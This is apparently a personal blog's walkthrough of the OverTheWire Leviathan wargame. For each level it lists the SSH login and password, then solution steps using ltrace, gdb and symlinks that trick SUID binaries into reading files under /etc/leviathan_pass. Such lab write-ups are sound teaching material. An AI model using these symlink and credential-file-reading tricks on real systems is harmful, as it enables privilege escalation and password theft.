---
title: 'Over The Wire - Leviathan'
date: '2023-04-19'
tags: ['Info Sec', 'Linux']
draft: false
summary: 'Walkthrough of each level of Over the Wire's Leviathan series. Its a CLI game which helps players master Linux, SSH, and much more.'
layout: PostSimple
bibliography: references-data.bib
canonicalUrl:
---

## Level 0

```
ssh leviathan0@leviathan.labs.overthewire.org -p 2223
```

```
leviathan0
```

## Level 1

`ltrace` prints the function calls which script invokes. It analyzes the program.

```
ssh leviathan1@leviathan.labs.overthewire.org -p 2223
```

```
PPIfmI1qsA
```

## Level 2

```
ssh leviathan2@leviathan.labs.overthewire.org -p 2223
```

```
mEh5PNl10e
```

```
mktemp -d
touch /tmp/tmp.s7E8Gz5BRw/"test file.txt"

ltrace ./printfile /tmp/tmp.s7E8Gz5BRw/"test file.txt"
```

Link file which points to

```
ln -s /etc/leviathan_pass/leviathan3 /tmp/tmp.s7E8Gz5BRw/test
```

```
chmod 777 /tmp/tmp.s7E8Gz5BRw
./printfile /tmp/tmp.s7E8Gz5BRw/"test file.txt"
```

https://www.unix.com/tips-and-tutorials/19060-unix-file-permissions.html

## Level 3

```
ssh leviathan3@leviathan.labs.overthewire.org -p 2223
```

```
Q0G8j4sakn
```

```
ltrace ./level3
```

Reading the output we see that the comparison password is hardcoded.

```
./level3
snlprintf

cat /etc/leviathan_pass/leviathan4
```

## Level 4 - Analyze file for SUID binaries

```
ssh leviathan4@leviathan.labs.overthewire.org -p 2223
```

```
AgvropI4OA
```

```
ls -al
cd .trash
./bin

echo 0100010101001011010010110110110001010100010001100011000101011000011100010111001100001010 | perl -lpe '$_=pack"B*",$_'
```

We notice `.trash` has elevated permissions so check it out.
The same thing happens for `.bin`.

The output is clearly binary so with a search we parse it to ASCII

## Level 5 -

```
ssh leviathan5@leviathan.labs.overthewire.org -p 2223
```

```
EKKlTF1Xqs
```

We notice the bin `leviathan5` fails so we create the log file for which it
complains after analyizing with ltrace.

```
touch /tmp/file.log
./leviathan5
```

```
ln -s /etc/leviathan_pass/leviathan6 /tmp/file.log
./leviathan5
```

Create a link to `leviathan6` from `file.log` which executes when we run the `leviathan5` bin.

## Level 6 - Hack password in register using gdb

```
ssh leviathan6@leviathan.labs.overthewire.org -p 2223
```

```
YZ55XPVk2l
```

Debug the script at assembly level using `gdb`

```
gdb --args leviathan6 0000
```

View every assembly level instruction in the script.

```
disassemble main
```

Set a breakpoint

```
break *0x0804922a
```

Run the program

```
run
```

See what values are contained within the registers

```
info registers
```

Make the comparison like the command would and check the output

```
print $ebp-0xc
x 0xffffd4cc
print/d 0x00001bd3

7123
```

```

```

## Level 7 - Analyze file for SUID binaries

```
ssh leviathan7@leviathan.labs.overthewire.org -p 2223
```

Incredible.

```
8GpZ5f8Hze
```
